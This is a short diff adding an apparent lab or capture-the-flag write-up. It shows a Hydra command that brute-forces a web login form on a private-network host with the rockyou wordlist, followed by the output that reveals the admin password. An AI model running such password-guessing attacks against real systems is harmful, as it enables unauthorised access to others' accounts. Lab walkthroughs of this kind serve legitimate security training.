@@ -1,0 +1,10 @@
+# I'm using Hydra to brute force the login
+
+hydra 192.168.56.101 http-get-form '/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif' -l admin -P /usr/share/wordlists/rockyou.txt
+
+# It returns this line :
+[80][http-get-form] host: 192.168.56.101   login: admin   password: shadow
+
+# We now have the credentials to login
+
+Done !
